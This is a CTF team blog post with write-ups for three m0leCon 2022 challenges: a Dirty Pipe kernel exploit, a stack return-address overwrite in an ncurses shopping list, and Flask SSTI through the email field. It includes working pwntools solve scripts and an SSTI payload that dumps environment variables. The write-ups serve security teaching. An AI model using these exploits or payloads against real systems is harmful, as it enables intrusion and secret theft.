<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>m0leCon CTF 2022 Teaser | Blog | bootplug</title><meta name=keywords content="ctf,pwn,dirty pipe,ssti"><meta name=description content="Writeups from m0leCon CTF 2022 qualifier"><meta name=author content="maritio_o, PewZ, klarz"><link rel=canonical href=https://bootplug.io/posts/ctf/m0leconctf_2022/><link crossorigin=anonymous href=/assets/css/stylesheet.min.6f60056d44d3f7eb69a4bc6c332b59960f3a995802bded244750232f33713c49.css integrity="sha256-b2AFbUTT9+tppLxsMytZlg86mVgCve0kR1AjLzNxPEk=" rel="preload stylesheet" as=style><link rel=preload href=/images/bootplug.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bootplug.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://bootplug.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bootplug.io/favicon-32x32.png><link rel=apple-touch-icon href=https://bootplug.io/apple-touch-icon.png><link rel=mask-icon href=https://bootplug.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.98.0"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="m0leCon CTF 2022 Teaser"><meta property="og:description" content="Writeups from m0leCon CTF 2022 qualifier"><meta property="og:type" content="article"><meta property="og:url" content="https://bootplug.io/posts/ctf/m0leconctf_2022/"><meta property="og:image" content="https://bootplug.io/papermod-cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-15T11:05:16+02:00"><meta property="article:modified_time" content="2022-05-15T11:05:16+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bootplug.io/papermod-cover.png"><meta name=twitter:title content="m0leCon CTF 2022 Teaser"><meta name=twitter:description content="Writeups from m0leCon CTF 2022 qualifier"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bootplug.io/posts/"},{"@type":"ListItem","position":2,"name":"CTFs","item":"https://bootplug.io/posts/ctf/"},{"@type":"ListItem","position":3,"name":"m0leCon CTF 2022 Teaser","item":"https://bootplug.io/posts/ctf/m0leconctf_2022/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"m0leCon CTF 2022 Teaser","name":"m0leCon CTF 2022 Teaser","description":"Writeups from m0leCon CTF 2022 qualifier","keywords":["ctf","pwn","dirty pipe","ssti"],"articleBody":"pwn dirtyRAT  Author: @Gaaat\nDescription: I bought this backdoor from some hacking/carding group on Telegram but I’m starting to suspect that I have been scammed… Can anyone help me access the only file I really need?\nnc dirtyrat.challs.m0lecon.it 10010\n We were given a binary and the source code.\nIt was mentioned early on that the title might be a wordplay on the recent Dirty Pipe vulnerability. But we disregarded the idea for a while. Also, we noticed a splice() in the code and found that a bit weird.\nRunning the binary, we get the following menu:\n60 seconds, PWN! Welcome to 88 88 88888888ba db 888888888888 88 \"\" ,d 88 \"8b d88b 88 88 88 88 ,8P d8'`8b 88 ,adPPYb,88 88 8b,dPPYba, MM88MMM 8b d8 88aaaaaa8P' d8' `8b 88 a8\" `Y88 88 88P' \"Y8 88 `8b d8' 88\"\"\"\"88' d8YaaaaY8b 88 8b 88 88 88 88 `8b d8' 88 `8b d8\"\"\"\"\"\"\"\"8b 88 \"8a, ,d88 88 88 88, `8b,d8' 88 `8b d8' `8b 88 `\"8bbdP\"Y8 88 88 \"Y888 Y88' 88 `8b d8' `8b 88 d8' d8' CLI Victim info:\tLinux bc31d47e2ff0 5.10.60-051060-generic #202108180439 SMP Wed Aug 18 08:59:30 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Whoami:\trat Available commands: 1)List files in folder. 2)Read file from our curated list of important files :) 3)Write data to one file from our curated list of important files :) 4)Win the CTF for me pls ≧◡≦ -1)Quit If we list files, we see there is a file called flag which we cannot read:\nYour choice: 1 total 1072 drwxr-xr-x 2 root root 4096 May 15 08:50 . drwxrwxrwt 1 root root 20480 May 15 08:50 .. -rw-r--r-- 1 user user 80 May 12 12:53 cards -rw-r--r-- 1 user user 48 May 12 12:53 conf -rwxr-xr-x 1 rat rat 1048040 May 12 12:53 dirtyRAT -rw-r--r-- 1 user user 31 May 12 12:53 flag -rw-r--r-- 1 user user 132 May 12 12:53 pasw -rw-r--r-- 1 user user 885 May 12 12:53 priv -rw-r--r-- 1 user user 43 May 12 12:53 secr What is interesting here is that the conf file contains a list of files we may read:\nYour choice: 2 Insert filename: conf How many bytes to read? (Max 127 eheheeheh): 127 File content: ##DIRTY CONFIG HEADER conf cards priv secr pasw PJ!� File read With this information and reading the code, we tried to exploit the binary.\nFirst, we tried to modify the config, but struggled since the only file we had write permissions to was dirtyRAT. Then we understood that the trouble with persmissions fit perfectly into the Dirty Pipe vulnerability. The version number you might have noticed under the banner is a kernel version vulnerable to Dirty Pipe. Also, the dirtyRAT binary contains all the code required to exploit the vulnerability. All we needed to do was to run them in the correct order:\n Fill the pipe with arbitrary data to set the PIPE_BUF_FLAG_CAN_MERGE flag Drain the pipe Splice 128 bytes from the priv file. We do this because there was a read in the way that we had to stop Splice 22 bytes from the conf file to skip header Add flag to the conf file  You can read more about exploiting the vulnerability here.\nThen after having flag successfully put into the conf file, we could read the file using the binary.\nAnd then we got the flag ptm{W4it_wa5nt_1t_r3ad_0nly!?}\nHere is the solve script:\n#!/usr/bin/env python # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host dirtyrat.challs.m0lecon.it --port 10010 ./files/chall/dirtyRAT from pwn import *  exe = context.binary = ELF('./files/chall/dirtyRAT') host = args.HOST or 'dirtyrat.challs.m0lecon.it' port = int(args.PORT or 10010)  def local(argv=[], *a, **kw):  '''Execute the target binary locally'''  if args.GDB:  return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  else:  return process([exe.path] + argv, *a, **kw)  def remote(argv=[], *a, **kw):  '''Connect to the process on the remote host'''  io = connect(host, port)  if args.GDB:  gdb.attach(io, gdbscript=gdbscript)  return io  def start(argv=[], *a, **kw):  '''Start the exploit against the target.'''  if args.LOCAL:  return local(argv, *a, **kw)  else:  return remote(argv, *a, **kw)  gdbscript = ''' tbreak main continue '''.format(**locals())  #=========================================================== # EXPLOIT GOES HERE #=========================================================== # Arch: amd64-64-little # RELRO: Partial RELRO # Stack: Canary found # NX: NX enabled # PIE: No PIE (0x400000)  io = start()  def menu(choice):  io.sendlineafter(\"choice: \", str(choice))  def list_files():  menu(1)  def read_file(filename, size):  menu(2)  io.sendlineafter(\"filename: \", filename)  io.sendlineafter(\": \", str(size))  io.recvuntil(\"File content:\")  io.recvline()  return io.recvline()  def write(filename, data, padding):  menu(3)  io.sendlineafter(\"filename: \", filename)  io.sendlineafter(\": \", data)  io.sendlineafter(\": \", str(padding))  # 1. prepare_pipe (fill + drain) # 2. splice 128 bytes from priv # 3. splice 22 bytes from conf to skip header # 4. write to pipe # 5. read flag  pipe_size = 0x10000 write(\"conf\", \"A\"*0x40, pipe_size - 0x40) read_file(\"priv\", 128) read_file(\"conf\", 22) write(\"conf\", \"flag\\n\", 0)  read_file(\"flag\", 127) flag = read_file(\"flag\", 127)[1:].decode().strip() log.success(f\"flag: {flag}\") io.close() ptmList  Author: @Alberto247\nDescription: Thanks to ptmList you can keep your shopping list in order!\nstty -icanon \u0026\u0026 socat - tcp:challs.m0lecon.it:8273 \u0026\u0026 stty icanon\n In this challenge we get an ncurses-like interface we have to interact with. We can buy, move/merge, and delete items. Additionally we also have the Secret gift menu option to modify an item. More on this later.\nWe can have up to 50 items. Each item is represented as two bytes: an index into a list of strings describing the item and a quantity. Free items are represented as having an index and/or quantity of 0xff.\nOne thing we quickly noticed in myListController() is that there is a loop to find the next free item, but it goes all the way up to 0xff (255) instead of 50. The number of allocated items is stored in a variable and is updated when adding or deleting items.\nDue to the suspicious loop we assumed that there was a way to overflow or underflow the number of items. There is a check to prevent more than 50 items being allocated, so we started looking at the code to delete/move items. First there is a check in myListHandle() that causes trouble for us when we try to delete items when the number of items is zero, so we looked at move instead.\nMoving two items will swap their positions (and keep the quantity of the second item). If you try to move items of the same type, they will be merged instead of moved. As long as the combined quantity doesn’t exceed 99, the items can be merged and one of them will be deleted. The deletion code moves all items after our merged items one slot down, overwriting the second item we merged with. Finally, the number of allocated items will be decremented.\nThe loop will stop once it encounters an item with an index or quantity of 0xff. This is where the Secret gift menu comes into the picture. This option allows us to set the quantity of an item to 0xff. If we change the quantity of an item to 0xff, the merging code will stop looping when it reaches this item. What happens if we try to merge an item with one that has a quantity of 0xff? The quantities will be merged, effectively subtracting 1 from the quantity of the first item. Then, when the code tries to move all other items it will stop on the first iteration since the quantity is 0xff. Finally, the number of items will be decreased by one. By abusing this behavior we can keep merging one item with another one that has a quantity of 0xff, which will decrease the quantity of the first item by 1 and also decrease the number of items without removing any of them. Doing this a few times will underflow the count to 0xff.\nWhen the number of items is set to 0xff we can access data on the stack outside the item array. We can write values by changing the quantity of items and by moving and merging items.\nOur attack plan: Ovewrite the two least significant bytes of the return address on the stack with the address of winfunc(). The three lowest nibbles will always be 0x5e7, so we decided to just bruteforce the last one. We ended up buying the item 0x35 times, resulting in the two least significant bytes being 0x35e7.\n Buy wanted item(s) (to ovewrite least significant bytes of the return address) Buy 2 x box of tissues Secret gift on last box of tissues, setting its quantity to 0xff Merge 4 times to underflow the number of items Merge return address and with target, thus overwriting the return address with winfunc()  After running the solve script a few times, you should get a shell.\nFlag: ptm{up_up_d0wn_down_l3ft_r1ght_lef7_r1ght_A_B_pwn}\nSolve script:\n#!/usr/bin/env python # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host challs.m0lecon.it --port 8273 ./shoppingList from pwn import *  exe = context.binary = ELF('./shoppingList') host = args.HOST or 'challs.m0lecon.it' port = int(args.PORT or 8273)  def local(argv=[], *a, **kw):  '''Execute the target binary locally'''  if args.GDB:  return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  else:  return process([exe.path] + argv, *a, **kw)  def remote(argv=[], *a, **kw):  '''Connect to the process on the remote host'''  io = connect(host, port)  if args.GDB:  gdb.attach(io, gdbscript=gdbscript)  return io  def start(argv=[], *a, **kw):  '''Start the exploit against the target.'''  if args.LOCAL:  return local(argv, *a, **kw)  else:  return remote(argv, *a, **kw)  gdbscript = ''' continue '''.format(**locals())  def down():  io.send(\"s\")  def up():  io.send(\"w\")  def exit():  for i in range(3):  io.recvuntil(\"Exit\")  down()  io.sendline(\"\")   def buy(idx, quantity):  io.sendline(\"\")  for i in range(idx):  down()  io.sendline(\"\")   for i in range(quantity):  down()  io.sendline(\"\")  io.send(\"\\x1b\")  def secret(idx):  down()  down()  io.sendline(\"\")   for i in range(idx):  down()  io.sendline(\"\")  io = start()  # buy item to set up for partial overwrite: 0x35e7 buy(0xe7, 0x35) buy(0, 10) buy(0, 10) secret(2)  down() io.sendline(\"\") down()  # merge 4 times to underflow for i in range(4):  io.send(\"m\")  down()  io.send(\"m\")  # go down to return address for i in range(59):  down()  # merge with first item we bought io.send(\"m\") for i in range(60):  up() io.send(\"m\")  # go back to main menu io.send(\"\\x1b\")  # exit - hopefully returns to winfunc() down() down() down() io.sendline(\"\")  io.interactive() web Dumb Forum  Author: @italianconcerto\nDescription: You’re telling me you can’t break such a simple forum?\n We are provided with a Flask application that contains a user system, but it is also possible to post public posts to the index page.\nThe flag is set in an environment variable in the Dockerfile. Knowing this we know our goal is to get access to the system environment variables.\nAfter reading through the source code of the Flask application, we find the following route (/profile) where the user can edit and view its profile.\n@app.route('/profile', methods=['GET', 'POST']) @login_required def profile():  with open('app/templates/profile.html') as p:  profile_html = p.read()   profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)   if(current_user.about_me == None):  current_user.about_me = \"\"  return render_template_string(profile_html) Flask has existing methods for rendering template, for example render_template. However, in this case we see that the profile route reads the template file and uses string format instead to inject the username, email, and about_me of the user into the template.\nIn profile.html we can see this:\nh5 class=\"card-title\"Username: %sh5 pEmail: %sp p class=\"\"About me: %sp The form is parsed through EditProfileForm, which contains:\nclass EditProfileForm(FlaskForm):  username = StringField('Username', validators=[DataRequired()])  about_me = TextAreaField('About me', validators=[Length(min=0, max=1000)])  submit = SubmitField('Submit')   def __init__(self, original_username, *args, **kwargs):  super(EditProfileForm, self).__init__(*args, **kwargs)  self.original_username = original_username   def validate_username(self, username):  for c in \"}{\":  if c in username.data:  abort(400)  #raise ValidationError('Please use valid characters.')  if username.data != self.original_username:  user = User.query.filter_by(username=self.username.data).first()  if user is not None:  abort(409)  #raise ValidationError('Please use a different username.')   def validate_about_me(self, about_me):  for c in \"}{\":  if c in about_me.data:  abort(400) The form validates the username and about_me fields, and checks if they contains either of }{ (which are typically used with SSTI (Server Side Template Injection). But the form does not allow editing the email field of the user.\nWe find another form, RegistrationForm which is used during registration, and it is here, and only here, the email of the user is set. The validation of the email does however not include the }{ validation, which means we can register with an email and potentially perform a SSTI.\nclass RegistrationForm(FlaskForm):  username = StringField('Username', validators=[DataRequired()])  email = StringField('Email', validators=[DataRequired(), Email()])  password = PasswordField('Password', validators=[DataRequired()])  password2 = PasswordField('Repeat Password', validators=[DataRequired(), EqualTo('password')])  submit = SubmitField('Register')   def validate_username(self, username):  for c in \"}{\":  if c in username.data:  raise ValidationError('Please use valid characters.')  user = User.query.filter_by(username=username.data).first()  if user is not None:  raise ValidationError('Please use a different username.')   def validate_email(self, email):  user = User.query.filter_by(email=email.data).first()  if user is not None:  raise ValidationError('Please use a different email address.') The email field does however include an email validator: email = StringField('Email', validators=[DataRequired(), Email()])\nWe see that this validator comes from wtforms: from wtforms.validators import ValidationError, DataRequired, Email, EqualTo\nLooking into the source code of the wtforms validator, we see that it uses the email-validator library.\nBy looking at the specification for the local-part of an email, we see that the following characters are allowed in an email:\n  uppercase and lowercase Latin letters A to Z and a to z digits 0 to 9 printable characters !#$%\u0026’*+-/=?^_`{|}~ dot ., provided that it is not the first or last character and provided also that it does not appear consecutively (e.g., John..Doe@example.com is not allowed).[5] space and special characters “(),:;@[] are allowed with restrictions (they are only allowed inside a quoted string, as described in the paragraph below, and in that quoted string, any backslash or double-quote must be preceded once by a backslash); comments are allowed with parentheses at either end of the local-part; e.g., john.smith(comment)@example.com and (comment)john.smith@example.com are both equivalent to john.smith@example.com.   This means that an email such as {{self.__dict__}}@a.a will be considered a valid email.\nWe now know that our goal is to perform a SSTI on the email field.\nWe can use the get_flashed_messages of Flask to get the __globals__ of the application. And with this we generate a payload that returns the environment variables of the system, resulting in the flag. {{get_flashed_messages.__globals__.os.environ}}@z.c\nEmail: environ({ \"PATH\":\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"HOSTNAME\":\"35250adbc3f0\", \"LANG\":\"C.UTF-8\", \"GPG_KEY\":\"A035C8C19219BA821ECEA86B64E628F8D684696D\", \"PYTHON_VERSION\":\"3.10.4\", \"PYTHON_PIP_VERSION\":\"22.0.4\", \"PYTHON_SETUPTOOLS_VERSION\":\"58.1.0\", \"PYTHON_GET_PIP_URL\":\"https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.py\", \"PYTHON_GET_PIP_SHA256\":\"e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279a\", \"FLASK_APP\":\"main.py\", \"FLAG\":\"ptm{d1d_u_f1nd_th3_r1ckr0ll?}\", \"HOME':\"/home/app\"} )@a.a FLAG: ptm{d1d_u_f1nd_th3_r1ckr0ll?}\n","wordCount":"2353","inLanguage":"en","datePublished":"2022-05-15T11:05:16+02:00","dateModified":"2022-05-15T11:05:16+02:00","author":[{"@type":"Person","name":"maritio_o"},{"@type":"Person","name":"PewZ"},{"@type":"Person","name":"klarz"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://bootplug.io/posts/ctf/m0leconctf_2022/"},"publisher":{"@type":"Organization","name":"Blog | bootplug","logo":{"@type":"ImageObject","url":"https://bootplug.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bootplug.io/ accesskey=h title="Blog (Alt + H)"><img src=/images/bootplug.png alt=logo aria-label=logo height=45>Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://bootplug.io/archive title=Archive><span>Archive</span></a></li><li><a href=https://bootplug.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://bootplug.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://bootplug.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bootplug.io/>Home</a>&nbsp;»&nbsp;<a href=https://bootplug.io/posts/>Posts</a>&nbsp;»&nbsp;<a href=https://bootplug.io/posts/ctf/>CTFs</a></div><h1 class=post-title>m0leCon CTF 2022 Teaser</h1><div class=post-description>Writeups from m0leCon CTF 2022 qualifier</div><div class=post-meta>May 15, 2022&nbsp;·&nbsp;12 min&nbsp;·&nbsp;maritio_o, PewZ, klarz</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#pwn aria-label=pwn>pwn</a><ul><li><a href=#dirtyrat aria-label=dirtyRAT>dirtyRAT</a></li><li><a href=#ptmlist aria-label=ptmList>ptmList</a></li></ul></li><li><a href=#web aria-label=web>web</a><ul><li><a href=#dumb-forum aria-label="Dumb Forum">Dumb Forum</a></li></ul></li></ul></div></details></div><div class=post-content><h1 id=pwn>pwn<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h1><h2 id=dirtyrat>dirtyRAT<a hidden class=anchor aria-hidden=true href=#dirtyrat>#</a></h2><blockquote><p><strong>Author:</strong> @Gaaat</p><p><strong>Description</strong>: I bought this backdoor from some hacking/carding group on Telegram but I&rsquo;m starting to suspect that I have been scammed&mldr;
Can anyone help me access the only file I really need?</p><p><code>nc dirtyrat.challs.m0lecon.it 10010</code></p></blockquote><p>We were given a binary and the source code.</p><p>It was mentioned early on that the title might be a wordplay on the recent <a href=https://dirtypipe.cm4all.com/>Dirty Pipe vulnerability</a>. But we disregarded the idea for a while. Also, we noticed a <code>splice()</code> in the code and found that a bit weird.</p><p>Running the binary, we get the following menu:</p><pre tabindex=0><code class="language-shell=" data-lang="shell=">60 seconds, PWN!
Welcome to

         88  88                                    88888888ba          db    888888888888
         88  &#34;&#34;                ,d                  88      &#34;8b        d88b        88
         88                    88                  88      ,8P       d8&#39;`8b       88
 ,adPPYb,88  88  8b,dPPYba,  MM88MMM  8b       d8  88aaaaaa8P&#39;      d8&#39;  `8b      88
a8&#34;    `Y88  88  88P&#39;   &#34;Y8    88     `8b     d8&#39;  88&#34;&#34;&#34;&#34;88&#39;       d8YaaaaY8b     88
8b       88  88  88            88      `8b   d8&#39;   88    `8b      d8&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;8b    88
&#34;8a,   ,d88  88  88            88,      `8b,d8&#39;    88     `8b    d8&#39;        `8b   88
 `&#34;8bbdP&#34;Y8  88  88            &#34;Y888      Y88&#39;     88      `8b  d8&#39;          `8b  88
                                          d8&#39;
                                         d8&#39;                                               CLI
Victim info:	Linux bc31d47e2ff0 5.10.60-051060-generic #202108180439 SMP Wed Aug 18 08:59:30 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
Whoami:		rat

Available commands:
1)List files in folder.
2)Read file from our curated list of important files :)
3)Write data to one file from our curated list of important files :)
4)Win the CTF for me pls ≧◡≦
-1)Quit
</code></pre><p>If we list files, we see there is a file called <code>flag</code> which we cannot read:</p><pre tabindex=0><code class="language-shell=" data-lang="shell=">Your choice: 1
total 1072
drwxr-xr-x 2 root root    4096 May 15 08:50 .
drwxrwxrwt 1 root root   20480 May 15 08:50 ..
-rw-r--r-- 1 user user      80 May 12 12:53 cards
-rw-r--r-- 1 user user      48 May 12 12:53 conf
-rwxr-xr-x 1 rat  rat  1048040 May 12 12:53 dirtyRAT
-rw-r--r-- 1 user user      31 May 12 12:53 flag
-rw-r--r-- 1 user user     132 May 12 12:53 pasw
-rw-r--r-- 1 user user     885 May 12 12:53 priv
-rw-r--r-- 1 user user      43 May 12 12:53 secr
</code></pre><p>What is interesting here is that the <code>conf</code> file contains a list of files we may read:</p><pre tabindex=0><code class="language-shell=" data-lang="shell=">Your choice: 2
Insert filename: conf
How many bytes to read? (Max 127 eheheeheh): 127
File content:
##DIRTY CONFIG HEADER
conf
cards
priv
secr
pasw
PJ!�
File read
</code></pre><p>With this information and reading the code, we tried to exploit the binary.</p><p>First, we tried to modify the config, but struggled since the only file we had write permissions to was <code>dirtyRAT</code>. Then we understood that the trouble with persmissions fit perfectly into the Dirty Pipe vulnerability. The version number you might have noticed under the banner is a kernel version vulnerable to Dirty Pipe. Also, the <code>dirtyRAT</code> binary contains all the code required to exploit the vulnerability. All we needed to do was to run them in the correct order:</p><ol><li>Fill the pipe with arbitrary data to set the PIPE_BUF_FLAG_CAN_MERGE flag</li><li>Drain the pipe</li><li>Splice 128 bytes from the priv file. We do this because there was a read in the way that we had to stop</li><li>Splice 22 bytes from the conf file to skip header</li><li>Add <code>flag</code> to the conf file</li></ol><p>You can read more about exploiting the vulnerability <a href=https://dirtypipe.cm4all.com/>here</a>.</p><p>Then after having <code>flag</code> successfully put into the conf file, we could read the file using the binary.</p><p>And then we got the flag <code>ptm{W4it_wa5nt_1t_r3ad_0nly!?}</code></p><p>Here is the solve script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This exploit template was generated via:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ pwn template --host dirtyrat.challs.m0lecon.it --port 10010 ./files/chall/dirtyRAT</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./files/chall/dirtyRAT&#39;</span>)
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>HOST <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;dirtyrat.challs.m0lecon.it&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> int(args<span style=color:#f92672>.</span>PORT <span style=color:#f92672>or</span> <span style=color:#ae81ff>10010</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>local</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> gdb<span style=color:#f92672>.</span>debug([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, gdbscript<span style=color:#f92672>=</span>gdbscript, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>remote</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> connect(host, port)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        gdb<span style=color:#f92672>.</span>attach(io, gdbscript<span style=color:#f92672>=</span>gdbscript)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> local(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> remote(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdbscript <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>tbreak main
</span></span></span><span style=display:flex><span><span style=color:#e6db74>continue
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span><span style=color:#f92672>.</span>format(<span style=color:#f92672>**</span>locals())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#===========================================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#                    EXPLOIT GOES HERE</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#===========================================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Arch:     amd64-64-little</span>
</span></span><span style=display:flex><span><span style=color:#75715e># RELRO:    Partial RELRO</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Stack:    Canary found</span>
</span></span><span style=display:flex><span><span style=color:#75715e># NX:       NX enabled</span>
</span></span><span style=display:flex><span><span style=color:#75715e># PIE:      No PIE (0x400000)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>menu</span>(choice):
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;choice: &#34;</span>, str(choice))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>list_files</span>():
</span></span><span style=display:flex><span>    menu(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_file</span>(filename, size):
</span></span><span style=display:flex><span>    menu(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;filename: &#34;</span>, filename)
